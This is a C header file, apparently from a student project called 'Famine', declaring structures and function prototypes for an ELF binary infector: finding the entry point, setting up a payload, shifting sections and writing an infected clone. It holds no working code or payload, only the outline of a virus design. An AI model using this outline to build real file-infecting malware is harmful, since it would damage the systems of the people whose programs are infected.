/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/05 06:48:19 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef INFECT_H
# define INFECT_H

# include <fcntl.h>
# include <stdint.h>
# include <unistd.h>
# include <sys/types.h>
# include "famine.h"

# define SHIFT_ALIGNMENT	4096
# define ALIGN(x, n)		(((x) + (n)) & ~((n) - 1))

/*
** file data
*/

struct				famine
{
	uint16_t		(*endian_2)(uint16_t);
	uint32_t		(*endian_4)(uint32_t);
	uint64_t		(*endian_8)(uint64_t);
};

struct				entry
{
	struct elf64_phdr	*safe_phdr;
	struct elf64_shdr	*safe_shdr;
	struct elf64_shdr	*safe_last_section_shdr;
	size_t			end_of_last_section;
	size_t			offset_in_section;
};

typedef	bool	(*f_iter_callback)(struct safe_pointer info, const size_t offset, void *data);

/*
** encryption
*/

// void	encrypt(uint num_rounds, char *data, uint32_t const key[4], size_t size);
// void	decrypt(uint num_rounds, char *data, uint32_t const key[4], size_t size);

/*
** iterators
*/

bool	foreach_phdr(struct safe_pointer info, f_iter_callback callback, void *data);
bool	foreach_shdr(struct safe_pointer info, f_iter_callback callback, void *data);
/*
** infect
*/

bool	find_entry(struct entry *original_entry, struct safe_pointer info);
bool	setup_payload(const struct entry *original_entry);
bool	adjust_references(size_t shift_amount, const struct entry *original_entry);
bool	copy_to_clone(size_t end_of_last_sect, size_t shift_amount, \
		size_t original_file_size);

/*
** endian
*/

uint16_t	endian_2_noswap(uint16_t n);
uint16_t	endian_2_swap(uint16_t n);
uint32_t	endian_4_noswap(uint32_t n);
uint32_t	endian_4_swap(uint32_t n);
uint64_t	endian_8_noswap(uint64_t n);
uint64_t	endian_8_swap(uint64_t n);

#endif
